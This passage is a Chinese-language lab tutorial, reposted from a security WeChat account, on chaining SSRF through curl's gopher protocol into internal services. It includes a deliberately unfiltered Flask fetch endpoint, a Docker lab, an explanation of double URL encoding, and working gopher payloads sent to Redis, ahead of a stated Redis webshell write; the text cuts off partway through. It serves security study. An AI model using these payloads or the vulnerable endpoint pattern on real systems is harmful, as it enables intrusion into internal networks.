---
title: 基于Gopher协议残存攻击面的SSRF内网协议链式探测
url: https://mp.weixin.qq.com/s/O1vSjOz3EjS3-0fx95HifA
source: Doonsec's feed
date: 2026-08-27
fetch_date: 2026-08-28T13:35:47.260490
---

# 基于Gopher协议残存攻击面的SSRF内网协议链式探测

# 基于Gopher协议残存攻击面的SSRF内网协议链式探测

guyu
guyu

神农Sec

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

课程培训

扫码咨询

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic)

#

专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（课程培训限时优惠）。

#

文章作者：guyu

文章来源：https://forum.butian.net/share/4965

01

0x1 基于Gopher协议残存攻击面的SSRF内网协议链式探测

这个特性在2000年代随着Web崛起被遗忘，但它从未被各大HTTP客户端库移除。libcurl从4.x时代就支持Gopher，并且至今默认编译进去。这意味着：任何调用系统curl的应用，都可能成为向内网任意TCP端口发送任意字节的跳板。

---

## 一、实验环境完整搭建

### 1.1 宿主机前置验证

在Kali Linux上确认curl带Gopher支持：

```
curl --version | grep Protocols
```

![img](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QX7pUVVADsY79t5afosic2X7NicUOictp38oy3icwVzicUotSDM4xMnfp6G7JQrLke0VTHc9ZEwOS7fLic8CaicSeC1ibhPFVHGsUmnN2I/640?wx_fmt=png&from=appmsg)

img

确认Docker和Docker Compose版本：

![img](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUPbWVibSp2q28EvMlcR1l0bFSHBYBeAHlLRheg5xxBGgTYkMcgKcQiboupTC6GfMqPxLQRAMPjxOtVPCKTBEX8A92RpdN4NH0X8/640?wx_fmt=png&from=appmsg)

img

### 1.2 目录结构

![img](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWMEsBaeXvVmakf8O5jp1JGibGkUIANlfQLv1JSku9LASRRtxA7yE595YzXDZUkKobwvGicGzYyeSicWk5vs62u4ChSwNbUicibVcNc/640?wx_fmt=png&from=appmsg)

img

### 1.3 SSRF靶机（Flask + subprocess curl）

Flask应用通过`subprocess`调用系统curl处理URL请求，这是现实环境中最常见的形式：运维脚本、图片抓取服务、URL预览功能，大量使用这种模式。

`ssrf-app/app.py`：

```
from flask import Flask, request, Response
import subprocess, shlex

app = Flask(__name__)

@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    if not url:
        return Response("missing url", status=400)
    try:
        # 没有任何协议或IP过滤 —— 模拟真实漏洞
        result = subprocess.run(
            ["curl", "-s", "--max-time", "8", url],
            capture_output=True,
            timeout=10,
        )
        return Response(result.stdout, content_type="application/octet-stream")
    except subprocess.TimeoutExpired:
        return Response("timeout", status=504)
    except Exception as e:
        return Response(str(e), status=500)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

`ssrf-app/requirements.txt`：

```
flask==3.1.0
```

`ssrf-app/Dockerfile`：

```
FROM python:3.12-slim
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY app.py .
CMD ["python", "app.py"]
```

### 1.4 webroot初始化

webroot卷由Redis、nginx、php-fpm共享。Redis写入webshell前，nginx需要能正常响应（nginx要求目录存在才能启动）：

```
echo '<?php phpinfo(); ?>' > ~/ssrf-lab/webroot/index.php
```

![img](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXlq5ZTzhLiaQicy41yrqaiaEeULPZbbpVYR2PQXDsoVibWMhW4hkz2utVgbaia1WC6tYic7XjbNusBCC9iaP5BaApvQMYo77pVuHO0ia0/640?wx_fmt=png&from=appmsg)

img

### 1.5 nginx配置

`nginx.conf`：

```
server {
    listen 80;
    root /var/www/html;
    index index.php;

    location ~ \.php$ {
        fastcgi_pass  phpfpm:9000;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include       fastcgi_params;
    }

    location / {
        try_files $uri $uri/ =404;
    }
}
```

### 1.6 docker-compose.yml

```
version: "3.9"

services:
  ssrf-target:
    build: ./ssrf-app
    ports:
      - "8080:8080"
    networks:
      - internal
      - external

  redis:
    image: redis:7-alpine
    # 以 www-data(uid=33) 运行：Redis 默认 umask(0177) 会让写出的文件权限为 600，
    # 若以 root 或其他 UID 运行，nginx/php-fpm（www-data）无法读取 shell.php。
    # 改为 uid=33 后文件属主与 nginx/php-fpm 一致，无需额外 chmod。
    user: "33:33"
    command: redis-server --protected-mode no --enable-protected-configs yes --loglevel verbose
    volumes:
      - webroot:/var/www/html
    networks:
      - internal

  nginx:
    image: nginx:alpine
    volumes:
      - webroot:/var/www/html
      - ./nginx.conf:/etc/nginx/conf.d/default.conf:ro
    networks:
      - internal

  phpfpm:
    image: php:8.1-fpm
    volumes:
      - webroot:/var/www/html
    networks:
      - internal

  memcached:
    image: memcached:1.5-alpine
    networks:
      - internal
  mysql:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_ALLOW_EMPTY_PASSWORD: "yes"
    networks:
      - internal

volumes:
  webroot:
    driver: local
    driver_opts:
      type: none
      o: bind
      # Docker local卷驱动要求绝对路径，./webroot 不生效；用 ${PWD} 展开
      device: ${PWD}/webroot

networks:
  internal:
    internal: true
  external: {}
```

### 1.7 启动靶场

```
cd ~/ssrf-lab
docker compose up -d --build
docker compose ps
```

![img](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWkCjh9TGAibthJ4X7wgJC4PfASnFBhUiahzsXTjnicjUUCNZ9UZrBHx43hMOOp4A6h8eu2qZpGjhDIDUf0Z6HJ4Ao9LBYhEpGkso/640?wx_fmt=png&from=appmsg)

img

基础连通性测试：

```
# SSRF端点可达
curl -s http://localhost:8080/fetch?url=http://nginx/
```

![img](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUtWBFF59lx1saQ7u376tZBr8fJ4w3YK5an8XtOljo4fpDzJZAuibIPGDhsicTTL6W4fhyCT2LwJPNUfEWoROTfjgV5u68ibe6VBM/640?wx_fmt=png&from=appmsg)

img

## 二、Gopher URI字节注入原理

Gopher URI格式：

```
gopher://<host>:<port>/<type><selector>
```

curl处理Gopher URL时执行以下操作：

1. 建立TCP连接到`host:port`
2. 对`/<type><selector>`中的第一个字符（type）跳过
3. 将剩余selector进行一次URL解码
4. 将解码结果作为原始字节写入TCP流
5. 读取响应直到连接关闭

所以`gopher://127.0.0.1:6379/_PING%0d%0a`的实际行为：

* 类型字节：`_`（跳过）
* 发送字节：`PING\r\n`（`%0d%0a`解码为`\r\n`）

### 2.1 编码层数验证

这是payload失败最常见的原因。Gopher URL通过SSRF端点传递时，存在两次解码：

```
攻击者发送的HTTP请求
  → 参数值被Flask URL解码一次，得到字符串传给subprocess curl
  → curl对Gopher路径URL解码一次，得到原始字节发送到TCP
```

因此，要让curl最终发送`\r\n`到TCP，需要在URL里写`%0d%0a`（给curl解码）；而这个`%0d%0a`需要原封不动地到达curl，所以传给Flask时必须写`%250d%250a`（`%25`是`%`的编码，Flask解码后得到`%0d%0a`，curl再解码得到`\r\n`）。

**实验验证**：

```
docker network inspect ssrf-lab_internal | grep '"Gateway"'
```

![img](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QW1bdvXI3GdiaBibXDE86DR4YYy1KBDPF4SWjPg7JSibyt4kdt9kSLSc4Do3LCnicgZdBHqHIwjlg8N5Uj50zsVcBPS2QicQEos0kvU/640?wx_fmt=png&from=appmsg)

img

```
#宿主机监听
nc -lvnp 9999
```

**情形1：curl直接访问Gopher，单层编码**

```
curl 'gopher://127.0.0.1:9999/_HELLO%0d%0a'
```

![img](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWzbKOaCcKKJ7kAzibjL6WFhO4PxaCEKeu8ic92CqnXe14hYUibxakJWRae9tu68KYGLdKN5iaR5HTlnXIHoBUErIoJmCNgvEMq2bs/640?wx_fmt=png&from=appmsg)

img

终端A收到`HELLO\r\n`，nc按行显示为`HELLO`。此时只有curl的一次解码。

**情形2：通过SSRF转发，必须双层编码且使用宿主机Docker IP**

双层编码：

```
curl -sG --data-urlencode 'url=gopher://172.18.0.1:9999/_HELLO%0d%0a' \
  http://localhost:8080/fetch
```

![img](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXnT4eRerXH8FmluXQGoWIbudAMCuF7CNkpP15ic5zEl2LxTIIrPdibicz3goAdGTIo8xEt4rbHKBtHPGGesgtia8XYK1ZembUlQGg/640?wx_fmt=png&from=appmsg)

img

`--data-urlencode`对参数值做URL编码：`%0d%0a`中的`%`被编码为`%25`，HTTP请求中实际传递`url=gopher%3A%2F%2F172.18.0.1%3A9999%2F_HELLO%250d%250a`。Flask解码得`gopher://172.18.0.1:9999/_HELLO%0d%0a`，curl解码`%0d%0a`为`\r\n`，终端A收到`HELLO\r\n`。

## 三、Redis协议攻击链

### 3.1 确认Redis可达及无认证

Redis服务名在Docker内网为`redis`，端口6379。所有通过SSRF发送的命令均需双层编码，使用`--data-urlencode`自动处理：

```
# 发送 PING\r\n（内联命令格式）
curl -sG --data-urlencode 'url=gopher://redis:6379/_PING%0d%0a' \
  http://localhost:8080/fetch
```

![img](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWvvl2T3UgtBBEE7fMvYZj792ibticOEWPuNMbFXEncBOsesR3Bib1ic1u0oL1uialtmdTW3ePWN0Z5upeGkRgMYnvAo7ib9yUNNywKY/640?wx_fmt=png&from=appmsg)

img

返回`+PONG`，说明Redis可达且无需认证。

获取Redis版本信息：

```
curl -sG --data-urlencode 'url=gopher://redis:6379/_INFO%20server%0d%0a' \
  http://localhost:8080/fetch | grep redis_version
```

![img](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUFMZR8qXf2uaTjpJrx3PpxMZDibXicHvICL5MIC0HkqZLXCTGzicooNINiaT1amVuYNzLfjxEqFM1d7HPXNgaIQmxlOgcDmyOoHtQ/640?wx_fmt=png&from=appmsg)

img

查看当前配置的工作目录和文件名：

```
curl -sG --data-urlencode 'url=gopher://redis:6379/_CONFIG%20GET%20dir%0d%0a' \
  http://localhost:8080/fetch
curl -sG -...